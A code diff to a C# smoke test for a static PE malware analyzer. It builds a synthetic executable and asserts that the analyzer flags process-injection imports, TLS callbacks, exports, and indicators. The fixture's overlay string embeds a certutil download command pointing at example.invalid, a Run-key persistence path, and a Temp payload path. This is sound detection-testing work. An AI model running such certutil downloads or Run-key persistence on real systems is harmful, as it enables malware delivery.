@@ -45,9 +45,66 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
             "digital_signature_present",
             "authenticode_signature_present",
             "signature_pkcs_signed_data",
+            "exports_present",
+            "export_registration_entrypoint",
+            "export_service_entrypoint",
+            "tls_directory_present",
+            "tls_callback_pointer",
+            "tls_callbacks",
             "url",
             "ip_address",
-            "public_ip_address");
+            "public_ip_address",
+            "email_address",
+            "registry_path_string",
+            "run_key_path_string",
+            "windows_path_string",
+            "lolbin_string");
+        SmokeAssert.True(
+            result.Sections.Any(section =>
+                string.Equals(section.Name, ".text", StringComparison.OrdinalIgnoreCase) &&
+                section.RawDataOffset == "0x00000200" &&
+                section.EntropyLabel.Length > 0 &&
+                section.IsExecutable &&
+                !section.IsWritable),
+            "StaticAnalyzer should expose structured section entropy/flag fields.");
+        SmokeAssert.True(
+            result.Imports.Any(module =>
+                string.Equals(module.ModuleName, "KERNEL32.dll", StringComparison.OrdinalIgnoreCase) &&
+                module.NamedApiCount == 3 &&
+                module.ApiNames.Contains("WriteProcessMemory", StringComparer.OrdinalIgnoreCase) &&
+                module.SuspiciousApiClusters.Contains("process-injection", StringComparer.OrdinalIgnoreCase)),
+            "StaticAnalyzer should expose structured import module/API fields.");
+        SmokeAssert.True(
+            result.ImportApiClusters.Any(cluster =>
+                string.Equals(cluster.Name, "process-injection", StringComparison.OrdinalIgnoreCase) &&
+                cluster.HitCount == 2 &&
+                cluster.ApiNames.Contains("CreateRemoteThread", StringComparer.OrdinalIgnoreCase)),
+            "StaticAnalyzer should expose structured suspicious import API clusters.");
+        SmokeAssert.True(
+            string.Equals(result.ExportModuleName, "SmokeDll.dll", StringComparison.OrdinalIgnoreCase) &&
+            result.ExportNames.Contains("DllRegisterServer", StringComparer.OrdinalIgnoreCase) &&
+            result.ExportNames.Contains("ServiceMain", StringComparer.OrdinalIgnoreCase),
+            "StaticAnalyzer should expose structured export module/name fields.");
+        SmokeAssert.True(
+            result.Tls is { DirectoryPresent: true } &&
+            string.Equals(result.Tls.CallbackTableVa, "0x1400010E0", StringComparison.OrdinalIgnoreCase) &&
+            result.Tls.Callbacks.Any(callback => string.Equals(callback.VirtualAddress, "0x140001010", StringComparison.OrdinalIgnoreCase)),
+            "StaticAnalyzer should expose structured TLS callback fields.");
+        SmokeAssert.True(
+            result.Overlay is { Present: true, ContainsCertificateTable: true, NonCertificateSize: > 0, NonCertificateEntropy: not null },
+            "StaticAnalyzer should expose structured overlay offsets, sizes, and entropy.");
+        SmokeAssert.True(
+            result.NetworkIndicators.Any(indicator => indicator.Kind == "url" && indicator.Value.StartsWith("https://overlay.example.invalid/", StringComparison.OrdinalIgnoreCase)) &&
+            result.NetworkIndicators.Any(indicator => indicator.Kind == "ipv4" && indicator.Classification == "public") &&
+            result.NetworkIndicators.Any(indicator => indicator.Kind == "email" && indicator.Value == "ops@example.invalid"),
+            "StaticAnalyzer should expose structured URL/IP/email indicators.");
+        SmokeAssert.True(
+            result.PathIndicators.Any(indicator => indicator.Kind == "registry" && indicator.Tags.Contains("run_key_path_string", StringComparer.OrdinalIgnoreCase)) &&
+            result.PathIndicators.Any(indicator => indicator.Kind == "filesystem" && indicator.Tags.Contains("executable_path_string", StringComparer.OrdinalIgnoreCase)),
+            "StaticAnalyzer should expose structured registry and filesystem path indicators.");
+        SmokeAssert.True(
+            result.CommandIndicators.Any(indicator => indicator.Category == "lolbin" && string.Equals(indicator.Tool, "certutil", StringComparison.OrdinalIgnoreCase)),
+            "StaticAnalyzer should expose structured LOLBIN command indicators.");
         SmokeAssert.True(
             result.InterestingStrings.Any(value => value.StartsWith("overlay:", StringComparison.OrdinalIgnoreCase)),
             "StaticAnalyzer should emit overlay-prefixed evidence.");
@@ -74,7 +131,7 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
         {
             ScenarioId = ScenarioId,
             Passed = true,
-            Message = "Static analyzer emits overlay, signature-table, URL, and IP evidence."
+            Message = "Static analyzer emits structured PE, overlay, signature, URL/IP/email, path, and command evidence."
         });
     }
 
@@ -116,10 +173,14 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
         WriteUInt32(buffer, optionalHeaderOffset + 108, 16);
 
         var dataDirectoryOffset = optionalHeaderOffset + 112;
+        WriteUInt32(buffer, dataDirectoryOffset, 0x1020);
+        WriteUInt32(buffer, dataDirectoryOffset + 4, 0x80);
         WriteUInt32(buffer, dataDirectoryOffset + 1 * 8, 0x1100);
         WriteUInt32(buffer, dataDirectoryOffset + 1 * 8 + 4, 0x3c);
         WriteUInt32(buffer, dataDirectoryOffset + 4 * 8, 0x500);
         WriteUInt32(buffer, dataDirectoryOffset + 4 * 8 + 4, 0x100);
+        WriteUInt32(buffer, dataDirectoryOffset + 9 * 8, 0x10b0);
+        WriteUInt32(buffer, dataDirectoryOffset + 9 * 8 + 4, 0x28);
 
         var sectionOffset = optionalHeaderOffset + 0xf0;
         var name = ".text"u8;
@@ -135,9 +196,11 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
             buffer[index] = 0x90;
         }
 
+        WriteSyntheticExportTable(buffer);
+        WriteSyntheticTlsDirectory(buffer);
         WriteSyntheticImportTable(buffer);
 
-        var overlayText = "https://overlay.example.invalid/payload 9.9.9.9";
+        var overlayText = "https://overlay.example.invalid/payload 9.9.9.9 ops@example.invalid HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KswordSmoke certutil.exe -urlcache -split -f http://example.invalid/a C:\\Users\\Public\\AppData\\Local\\Temp\\payload.exe";
         var overlayBytes = System.Text.Encoding.ASCII.GetBytes(overlayText);
         overlayBytes.CopyTo(buffer.AsSpan(0x410, overlayBytes.Length));
 
@@ -148,6 +211,40 @@ internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScena
         FillDeterministicBytes(buffer, 0x600, buffer.Length, 0x2468ace0);
 
         File.WriteAllBytes(path, buffer);
+    }
+
+    /// <summary>
+    /// Writes a bounded export directory with registration/service-like names.
+    /// </summary>
+    private static void WriteSyntheticExportTable(byte[] buffer)
+    {
+        WriteUInt32(buffer, 0x220 + 12, 0x1068);
+        WriteUInt32(buffer, 0x220 + 16, 1);
+        WriteUInt32(buffer, 0x220 + 20, 2);
+        WriteUInt32(buffer, 0x220 + 24, 2);
+        WriteUInt32(buffer, 0x220 + 28, 0x1050);
+        WriteUInt32(buffer, 0x220 + 32, 0x1058);
+        WriteUInt32(buffer, 0x220 + 36, 0x1060);
+
+        WriteUInt32(buffer, 0x250, 0x1000);
+        WriteUInt32(buffer, 0x254, 0x1010);
+        WriteUInt32(buffer, 0x258, 0x1078);
+        WriteUInt32(buffer, 0x25c, 0x1090);
+        WriteUInt16(buffer, 0x260, 0);
+        WriteUInt16(buffer, 0x262, 1);
+        WriteAsciiString(buffer, 0x268, "SmokeDll.dll");
+        WriteAsciiString(buffer, 0x278, "DllRegisterServer");
+        WriteAsciiString(buffer, 0x290, "ServiceMain");
+    }
+
+    /// <summary>
+    /// Writes a PE32+ TLS directory with one callback VA and a null terminator.
+    /// </summary>
+    private static void WriteSyntheticTlsDirectory(byte[] buffer)
+    {
+        WriteUInt64(buffer, 0x2b0 + 24, 0x1400010e0);
+        WriteUInt64(buffer, 0x2e0, 0x140001010);
+        WriteUInt64(buffer, 0x2e8, 0);
     }
 
     /// <summary>
